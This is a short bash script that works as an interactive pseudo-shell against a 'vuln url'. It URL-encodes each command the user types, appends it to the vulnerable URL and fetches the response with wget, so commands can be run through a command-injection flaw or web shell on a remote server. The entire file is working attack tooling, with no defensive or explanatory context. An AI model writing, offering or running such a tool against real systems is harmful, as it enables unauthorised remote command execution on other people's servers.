#!/bin/bash
if [ -z $1 ] 
then 
echo -n "enter vuln url: "
read a
else
a=$1
fi
while true 
echo -n "$ "
do read i
e=$(sed 's/\ /\%20/g' <<<$i)
b=$(sed 's/\;/\%3B/g' <<<$e)
f=$a$b
#echo "* --> * --> " $f " <-- * <-- *"
z=$(perl -MURI::Escape -e 'print uri_escape shift, , q{^A-Za-z0-9\-._~/:}' -- $f)
wget -qO - $z
done
